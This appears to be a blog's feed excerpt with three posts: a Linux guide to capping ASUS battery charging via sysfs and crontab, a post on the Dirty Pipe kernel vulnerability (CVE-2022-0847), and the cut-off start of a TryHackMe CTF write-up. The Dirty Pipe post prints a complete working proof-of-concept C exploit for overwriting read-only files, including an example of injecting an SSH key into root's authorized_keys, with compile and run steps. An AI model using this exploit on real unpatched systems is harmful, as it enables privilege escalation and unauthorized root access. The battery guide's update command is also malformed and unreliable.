<p id="9494" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Nowadays Asus laptops have a preinstalled program called <strong class="ly kz">Asus Battery Health Charging</strong>. In recent laptops, this feature is integrated into the <strong class="ly kz">MyAsus</strong> application. Using this feature users can set the charging threshold to 60% when they use it on AC power. A laptop will maintain a 60% charge when connected to AC power. This feature reduces laptop heating and improves performance. But, most important of all, it extends the life of the laptop battery.</p>
<p id="3cc8" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Although it’s a great feature to have, it is limited to <strong class="ly kz">Windows OS</strong> only. So, users who want to shift to <strong class="ly kz">Linux OS</strong> (like <strong class="ly kz">Ubuntu</strong>, <strong class="ly kz">Linux</strong> <strong class="ly kz">Mint</strong>, <strong class="ly kz">Elementary OS</strong>, <strong class="ly kz">Pop OS,</strong> etc.) for better performance or due to other reasons will face a great disappointment. In a way, it will discourage users to use <strong class="ly kz">Linux</strong> on their <strong class="ly kz">Asus Laptops</strong>.</p>
<p id="6598" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Even though there is no official support by Asus for Linux Operating Systems, there is an easy way to enable <strong class="ly kz">Asus Battery Health Charging</strong> or in common language <strong class="ly kz">battery charging threshold</strong> in Linux operating systems. In this post, I will be discussing the whole process to enable the same.</p>
<p id="209a" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">However, as a side note, this method will work on most the Linux-based OS’s and has been tested on the latest versions of <strong class="ly kz">Ubuntu</strong> and other <strong class="ly kz">Ubuntu-based OS</strong> (Kubuntu, Lubuntu, Xubuntu, etc.), <strong class="ly kz">Linux Mint</strong>, <strong class="ly kz">PopOS</strong>, <strong class="ly kz">Elementary OS,</strong> and <strong class="ly kz">Zorin OS</strong>.</p>
</div>
</div>
</div>
<div class="ab cm aku anc nx and" role="separator"> </div>
<div class="fp tp tq tr ts">
<div class="ab cm">
<div class="gv bg gw gx gy gz">
<h2 id="1573" class="zn zf tu be zg zo anh zq ld zr ani zt lh zu anj zw zx zy ank aba abb abc anl abe abf abg bj">So, Let’s begin our journey</h2>
<p id="32a0" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph="">Firstly make sure that your system is up to date. If not sure, then try running this command in the terminal:</p>
<pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="542a" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">sudo apt-get update &amp;&amp; upgrade -y</span></pre>
<p id="4418" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Let’s start by figuring out the battery name for your ASUS laptop. This can be done by using the following command:</p>
<pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="8f50" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">ls /sys/class/power_supply</span></pre>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km anm">
<figure class="bg yx yy c"><figure class="is-loaded"><img  role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*R8yHmhBQMGAdPtwZU0MUxA.png" alt="" width="700" height="194" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="018c" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">We can change the value by simply running the following command in the terminal:</p>
<h4 id="e832" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj">For laptops with BAT0:</h4>
<pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="40a7" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">echo 60 | sudo tee /sys/class/power_supply/BAT0/charge_control_end_threshold</span></pre>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km ann">
<figure class="bg yx yy c"><figure class="is-loaded"><img  role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*2rGPkDlit3Y8I9rdi5cVYQ.png" alt="" width="700" height="137" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="5ca2" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">This method works but, <strong class="ly kz">it is not a permanent solution</strong> as it will revert back to its default value i.e. 100 after reboot. So, you have to run this command every time the laptop restarts.</p>
<p id="d353" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">So we move to the next step to make it permanent.</p>
<h4 id="f94d" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj">Now try to make permanent</h4>
<p id="bbee" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph="">So, to make it permanent we have to run this command at every startup. To achieve that we have to add this command to the <strong class="ly kz"><em class="abt">/etc/crontab</em></strong> file. (In Linux, using <strong class="ly kz">crontab</strong> we can run different activities at different instances. In this case, we shall run the command at reboot.)</p>
<p id="ac5d" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">To edit the <strong class="ly kz">‘crontab’</strong> file run the following command in the terminal:</p>
<pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="5f40" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">sudo nano /etc/crontab</span></pre>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km ano">
<figure class="bg yx yy c"><figure class="is-loaded"><img  role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*F3fttIjAIqyA2sdRsUzbSw.png" alt="" width="700" height="319" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="bcf7" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now add the following lines at the end of the <strong class="ly kz">crontab</strong> file:</p>
<h4 id="e99d" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj"><strong>For BAT0:</strong></h4>
<pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="ce27" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">@reboot root echo 60 &gt; /sys/class/power_supply/BAT0/charge_control_end_threshold</span></pre>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km anp">
<figure class="bg yx yy c"><figure class="is-loaded"><img  role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*crdQP5Ayef9uP40Cvt_3ug.png" alt="" width="700" height="384" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="a1d6" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">(In my case, I did it before. so, I don’t open it with sudo. For this reason, it shows unwriteable. But if you open it with sudo it will writeable.)</p>
<blockquote class="abq abr abs">
<p id="d72f" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph="">Now press “ctrl + x”, then “y” Then “enter”</p>
</blockquote>
<p id="a217" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">IT makes that file save. Is it saved or not let’s check it:</p>
<pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="f0e5" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">cat /etc/crontab</span></pre>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km anp">
<figure class="bg yx yy c"><figure class="is-loaded"><img  role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*b13t-rcZbnt2HATvewN2ug.png" alt="" width="700" height="384" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p data-selectable-paragraph="">Now, every time you’ll reboot the laptop, <strong class="ly kz">Asus Battery Health Charging</strong> will be enabled by default. Now you can work on your Linux system without worries.<br><br></p>
<p id="d210" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Thanks for Reading!!</strong></p>
<p id="caaa" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Follow me on Twitter</strong>: <a class="af rn" href="https://twitter.com/sakibulalikhan" rel="noopener ugc nofollow" target="_blank">https://twitter.com/sakibulalikhan</a></p>
<p id="a415" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Happy ASUS Battery Health Charging~</strong></p>
</div>
</div>
</div>
            ]]>
        </content>
    </entry>
    <entry>
        <title>The Dirty Pipe Vulnerability On Linux</title>
        <author>
            <name>Sakibul Ali Khan</name>
        </author>
        <link href="https://sakibulalikhan.pages.dev/the-dirty-pipe-vulnerability-on-linux.html"/>
        <id>https://sakibulalikhan.pages.dev/the-dirty-pipe-vulnerability-on-linux.html</id>
        <media:content url="https://sakibulalikhan.pages.dev/media/posts/2/The-Dirty-Pipe-lg.jpg" medium="image" />
            <category term="Pentesting"/>
            <category term="Linux Privilege Escalations"/>
            <category term="Linux"/>
            <category term="Cyber Security"/>
            <category term="CVE"/>

        <updated>2024-01-07T10:34:54+06:00</updated>
            <summary>
                <![CDATA[
                        <img src="https://sakibulalikhan.pages.dev/media/posts/2/The-Dirty-Pipe-lg.jpg" alt="The Dirty Pipe Vulnerability On Linux" />
                    Hi, folks. I wanna talk about CVE-2022–0847. &amp; it's called Dirty pipe vulnerability. This is a vulnerability in the Linux kernel since 5.8 which allows overwriting&hellip;
                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                    <p><img src="https://sakibulalikhan.pages.dev/media/posts/2/The-Dirty-Pipe-lg.jpg" class="type:primaryImage" alt="The Dirty Pipe Vulnerability On Linux" /></p>
                <p id="1fb8" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong>H</strong>i, folks. I wanna talk about <a class="af rn" href="https://nvd.nist.gov/vuln/detail/cve-2022-0847" rel="noopener ugc nofollow" target="_blank">CVE-2022–0847</a>. &amp; it's called Dirty pipe vulnerability. This is a vulnerability in the Linux kernel since 5.8 which allows overwriting data in arbitrary read-only files. This leads to privilege escalation because unprivileged processes can inject code into root processes.</p>
<p id="628e" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">The vulnerability was discovered by Max Kellermann in April 2021. The bug report, exploit, and patch was sent to the <a class="af rn" href="https://www.kernel.org/doc/html/latest/admin-guide/security-bugs.html" rel="noopener ugc nofollow" target="_blank">Linux kernel security team</a> by Kellermann on February 20. The bug was reproduced on Google Pixel 6 and a bug report was sent to the Android Security Team.</p>
<p id="8352" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">He also sends mail to oss-security about the vulnerability he found.</p>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km amw">
<figure class="bg yx yy c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*CoOqoghwTFDNxE8tGfnvFg.png" alt="Dirty pipe POC" width="700" height="413" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="29f0" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">This vulnerability is similar to <a class="af rn" href="https://dirtycow.ninja/" rel="noopener ugc nofollow" target="_blank">CVE-2016–5195 “Dirty Cow”</a> but is easier to exploit. The vulnerability <a class="af rn" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=9d2231c5d74e13b2a0546fee6737ee4446017903" rel="noopener ugc nofollow" target="_blank">was fixed</a> in Linux 5.16.11, 5.15.25, and 5.10.102.</p>
<p id="d369" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">I don’t go deep about the vulnerability, because he did that perfectly. You can find that here <a class="af rn" href="https://dirtypipe.cm4all.com/" rel="noopener ugc nofollow" target="_blank">https://dirtypipe.cm4all.com/</a></p>
<p id="7c56" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">I just show you how can you exploit through this POC code…</p>
<pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="50ae" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph=""><em class="abt">/* SPDX-License-Identifier: GPL-2.0 */</em><br><em class="abt">/*</em><br><em class="abt"> * Copyright 2022 CM4all GmbH / IONOS SE</em><br><em class="abt"> *</em><br><em class="abt"> * author: Max Kellermann &lt;max.kellermann@ionos.com&gt;</em><br><em class="abt"> *</em><br><em class="abt"> * Proof-of-concept exploit for the Dirty Pipe</em><br><em class="abt"> * vulnerability (CVE-2022-0847) caused by an uninitialized</em><br><em class="abt"> * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any</em><br><em class="abt"> * file contents in the page cache, even if the file is not permitted</em><br><em class="abt"> * to be written, immutable or on a read-only mount.</em><br><em class="abt"> *</em><br><em class="abt"> * This exploit requires Linux 5.8 or later; the code path was made</em><br><em class="abt"> * reachable by commit f6dd975583bd ("pipe: merge</em><br><em class="abt"> * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was</em><br><em class="abt"> * there before, it just provided an easy way to exploit it.</em><br><em class="abt"> *</em><br><em class="abt"> * There are two major limitations of this exploit: the offset cannot</em><br><em class="abt"> * be on a page boundary (it needs to write one byte before the offset</em><br><em class="abt"> * to add a reference to this page to the pipe), and the write cannot</em><br><em class="abt"> * cross a page boundary.</em><br><em class="abt"> *</em><br><em class="abt"> * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'</em><br><em class="abt"> *</em><br><em class="abt"> * Further explanation: https://dirtypipe.cm4all.com/</em><br><em class="abt"> */</em><br><br>#define _GNU_SOURCE<br>#include <em class="abt">&lt;unistd.h&gt;</em><br>#include <em class="abt">&lt;fcntl.h&gt;</em><br>#include <em class="abt">&lt;stdio.h&gt;</em><br>#include <em class="abt">&lt;stdlib.h&gt;</em><br>#include <em class="abt">&lt;string.h&gt;</em><br>#include <em class="abt">&lt;sys/stat.h&gt;</em><br>#include <em class="abt">&lt;sys/user.h&gt;</em><br><br>#ifndef PAGE_SIZE<br>#define PAGE_SIZE 4096<br>#endif<br><br><em class="abt">/**</em><br><em class="abt"> * Create a pipe where all "bufs" on the pipe_inode_info ring have the</em><br><em class="abt"> * PIPE_BUF_FLAG_CAN_MERGE flag set.</em><br><em class="abt"> */</em><br><strong class="abp kz">static</strong> void prepare_pipe(int p[2])<br>{<br>	<strong class="abp kz">if</strong> (pipe(p)) abort();<br><br>	<strong class="abp kz">const</strong> unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);<br>	<strong class="abp kz">static</strong> char buffer[4096];<br><br>	<em class="abt">/* fill the pipe completely; each pipe_buffer will now have</em><br><em class="abt">	   the PIPE_BUF_FLAG_CAN_MERGE flag */</em><br>	<strong class="abp kz">for</strong> (unsigned r = pipe_size; r &gt; 0;) {<br>		unsigned n = r &gt; <strong class="abp kz">sizeof</strong>(buffer) ? <strong class="abp kz">sizeof</strong>(buffer) : r;<br>		write(p[1], buffer, n);<br>		r -= n;<br>	}<br><br>	<em class="abt">/* drain the pipe, freeing all pipe_buffer instances (but</em><br><em class="abt">	   leaving the flags initialized) */</em><br>	<strong class="abp kz">for</strong> (unsigned r = pipe_size; r &gt; 0;) {<br>		unsigned n = r &gt; <strong class="abp kz">sizeof</strong>(buffer) ? <strong class="abp kz">sizeof</strong>(buffer) : r;<br>		read(p[0], buffer, n);<br>		r -= n;<br>	}<br><br>	<em class="abt">/* the pipe is now empty, and if somebody adds a new</em><br><em class="abt">	   pipe_buffer without initializing its "flags", the buffer</em><br><em class="abt">	   will be mergeable */</em><br>}<br><br>int main(int argc, char **argv)<br>{<br>	<strong class="abp kz">if</strong> (argc != 4) {<br>		fprintf(stderr, "Usage: %s TARGETFILE OFFSET DATA<strong class="abp kz">\n</strong>", argv[0]);<br>		<strong class="abp kz">return</strong> EXIT_FAILURE;<br>	}<br><br>	<em class="abt">/* dumb command-line argument parser */</em><br>	<strong class="abp kz">const</strong> char *<strong class="abp kz">const</strong> path = argv[1];<br>	loff_t offset = strtoul(argv[2], NULL, 0);<br>	<strong class="abp kz">const</strong> char *<strong class="abp kz">const</strong> data = argv[3];<br>	<strong class="abp kz">const</strong> size_t data_size = strlen(data);<br><br>	<strong class="abp kz">if</strong> (offset % PAGE_SIZE == 0) {<br>		fprintf(stderr, "Sorry, cannot start writing at a page boundary<strong class="abp kz">\n</strong>");<br>		<strong class="abp kz">return</strong> EXIT_FAILURE;<br>	}<br><br>	<strong class="abp kz">const</strong> loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;<br>	<strong class="abp kz">const</strong> loff_t end_offset = offset + (loff_t)data_size;<br>	<strong class="abp kz">if</strong> (end_offset &gt; next_page) {<br>		fprintf(stderr, "Sorry, cannot write across a page boundary<strong class="abp kz">\n</strong>");<br>		<strong class="abp kz">return</strong> EXIT_FAILURE;<br>	}<br><br>	<em class="abt">/* open the input file and validate the specified offset */</em><br>	<strong class="abp kz">const</strong> int fd = open(path, O_RDONLY); <em class="abt">// yes, read-only! :-)</em><br>	<strong class="abp kz">if</strong> (fd &lt; 0) {<br>		perror("open failed");<br>		<strong class="abp kz">return</strong> EXIT_FAILURE;<br>	}<br><br>	<strong class="abp kz">struct</strong> <strong class="abp kz">stat</strong> st;<br>	<strong class="abp kz">if</strong> (fstat(fd, &amp;st)) {<br>		perror("stat failed");<br>		<strong class="abp kz">return</strong> EXIT_FAILURE;<br>	}<br><br>	<strong class="abp kz">if</strong> (offset &gt; st.st_size) {<br>		fprintf(stderr, "Offset is not inside the file<strong class="abp kz">\n</strong>");<br>		<strong class="abp kz">return</strong> EXIT_FAILURE;<br>	}<br><br>	<strong class="abp kz">if</strong> (end_offset &gt; st.st_size) {<br>		fprintf(stderr, "Sorry, cannot enlarge the file<strong class="abp kz">\n</strong>");<br>		<strong class="abp kz">return</strong> EXIT_FAILURE;<br>	}<br><br>	<em class="abt">/* create the pipe with all flags initialized with</em><br><em class="abt">	   PIPE_BUF_FLAG_CAN_MERGE */</em><br>	int p[2];<br>	prepare_pipe(p);<br><br>	<em class="abt">/* splice one byte from before the specified offset into the</em><br><em class="abt">	   pipe; this will add a reference to the page cache, but</em><br><em class="abt">	   since copy_page_to_iter_pipe() does not initialize the</em><br><em class="abt">	   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */</em><br>	--offset;<br>	ssize_t nbytes = splice(fd, &amp;offset, p[1], NULL, 1, 0);<br>	<strong class="abp kz">if</strong> (nbytes &lt; 0) {<br>		perror("splice failed");<br>		<strong class="abp kz">return</strong> EXIT_FAILURE;<br>	}<br>	<strong class="abp kz">if</strong> (nbytes == 0) {<br>		fprintf(stderr, "short splice<strong class="abp kz">\n</strong>");<br>		<strong class="abp kz">return</strong> EXIT_FAILURE;<br>	}<br><br>	<em class="abt">/* the following write will not create a new pipe_buffer, but</em><br><em class="abt">	   will instead write into the page cache, because of the</em><br><em class="abt">	   PIPE_BUF_FLAG_CAN_MERGE flag */</em><br>	nbytes = write(p[1], data, data_size);<br>	<strong class="abp kz">if</strong> (nbytes &lt; 0) {<br>		perror("write failed");<br>		<strong class="abp kz">return</strong> EXIT_FAILURE;<br>	}<br>	<strong class="abp kz">if</strong> ((size_t)nbytes &lt; data_size) {<br>		fprintf(stderr, "short write<strong class="abp kz">\n</strong>");<br>		<strong class="abp kz">return</strong> EXIT_FAILURE;<br>	}<br><br>	printf("It worked!<strong class="abp kz">\n</strong>");<br>	<strong class="abp kz">return</strong> EXIT_SUCCESS;<br>}</span></pre>
<p id="17a9" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">In your Linux system fire terminal and open nano &amp; save the above code like dirty_pipe.c .</p>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km amx">
<figure class="bg yx yy c"><figure class="is-loaded"><img  role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*fu1-454ZkR6AUwXiOLk73g.png" alt="" width="700" height="189" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
<figcaption class="yz za zb kl km zc zd be b bf z dl" data-selectable-paragraph="">nano diry_pipe.c</figcaption>
</figure>
<p id="2831" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now make a private text file with sudo command, because with this exploit we try to change the read-only file as a nonprevilius user.</p>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km amx">
<figure class="bg yx yy c"><figure class="is-loaded"><img  role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*3sipskKsazczKZU6nbW4UQ.png" alt="" width="700" height="225" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="b19d" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now with gcc we compile our exploit. For this the command is…</p>
<pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="ad36" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">$gcc dirty_pipe.c -o dirty_pipe</span></pre>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km amy">
<figure class="bg yx yy c"><figure class="is-loaded"><img  role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*ujnCSr9la4o6xW3Dz0zxzA.png" alt="" width="700" height="253" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="1a2b" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we try to edit the looked file with nonprevilius user. For that, we gonna do..</p>
<pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="bf27" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">$./dirty_pipe private.txt 1 'your text'</span></pre>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km amz">
<figure class="bg yx yy c"><figure class="is-loaded"><img  role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*QiOVCmqimzg3FZntsEGXcA.png" alt="" width="700" height="155" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="17e7" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">That’s it for today. see you in another post.</p>
<figure class="yq yr ys yt yu yv">
<div class="ca ja l dj">
<div class="anb kt l">
<div class="post__iframe"><div class="post__iframe"><iframe width="680" height="560" loading="lazy" src="https://cdn.embedly.com/widgets/media.html?type=text%2Fhtml&amp;key=a19fcc184b9711e1b4764040d3dc5c07&amp;schema=twitter&amp;url=https%3A//twitter.com/bl4sty/status/1500812285358530561&amp;image=https%3A//i.embed.ly/1/image%3Furl%3Dhttps%253A%252F%252Fabs.twimg.com%252Ferrors%252Flogo46x38.png%26key%3Da19fcc184b9711e1b4764040d3dc5c07" allowfullscreen="allowfullscreen" frameborder="0" title="blasty on Twitter: &quot;Dirty Pipe PoC (https://t.co/ql5Y8pWDBj) works beautifully. 🤑 pic.twitter.com/OrRYJE5skC / Twitter&quot;" class="fd n kh di bg" scrolling="no" data-mce-fragment="1"></iframe></div></div>
</div>
</div>
</figure>
<h3 class="align-left">The End.</h3>
<p id="d210" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Thanks for Reading!!</strong></p>
<p id="caaa" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Follow me on Twitter</strong>: <a class="af rn" href="https://twitter.com/sakibulalikhan" rel="noopener ugc nofollow" target="_blank">https://twitter.com/sakibulalikhan</a></p>
<p id="a415" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Happy Linux Exploit~</strong></p>
            ]]>
        </content>
    </entry>
    <entry>
        <title>TryHackMe Writeup — VulnNet Internal</title>
        <author>
            <name>Sakibul Ali Khan</name>
        </author>
        <link href="https://sakibulalikhan.pages.dev/tryhackme-writeup-vulnnet-internal.html"/>
        <id>https://sakibulalikhan.pages.dev/tryhackme-writeup-vulnnet-internal.html</id>
        <media:content url="https://sakibulalikhan.pages.dev/media/posts/1/maxresdefault-4012345193.jpg" medium="image" />
            <category term="TryHackMe"/>
            <category term="CTF Writeups"/>

        <updated>2024-01-07T10:27:18+06:00</updated>
            <summary>
                <![CDATA[
                        <img src="https://sakibulalikhan.pages.dev/media/posts/1/maxresdefault-4012345193.jpg" alt="TryHackMe Writeup — VulnNet Internal" />
                    VulnNet: Internal is a Easy/Medium level Box. It includes enumerating different services and finding useful information to gain user access. For privilege escalation we have to&hellip;
                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                    <p><img src="https://sakibulalikhan.pages.dev/media/posts/1/maxresdefault-4012345193.jpg" class="type:primaryImage" alt="TryHackMe Writeup — VulnNet Internal" /></p>
                <div class="post__inner">
<div class="post__entry">
<p id="dc75" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">VulnNet: Internal</strong> is a Easy/Medium level Box. It includes enumerating different services and finding useful information to gain user access. For privilege escalation we have to use port forwarding to access TeamCity service and then we can run commands as root user.</p>
<p id="7e0a" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">TryHackMe Room Link: <a class="af rn" href="https://tryhackme.com/room/vulnnetinternal" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/vulnnetinternal</a></p>
<h4><strong>There are four flags that need to be submitted in order to complete the challenge:</strong></h4>
<ol>
<li>Service Flag</li>
<li>Internal Flag</li>
<li>User Flag</li>
<li>Root Flag</li>
</ol>
<h2>Enumeration</h2>
<p id="ac8b" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph="">We start the enumeration with a <code class="ff abm abn abo abp b">nmap</code> scan to look for open ports and running services</p>
<p id="08fc" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph=""><strong>Nmap Scan</strong></p>
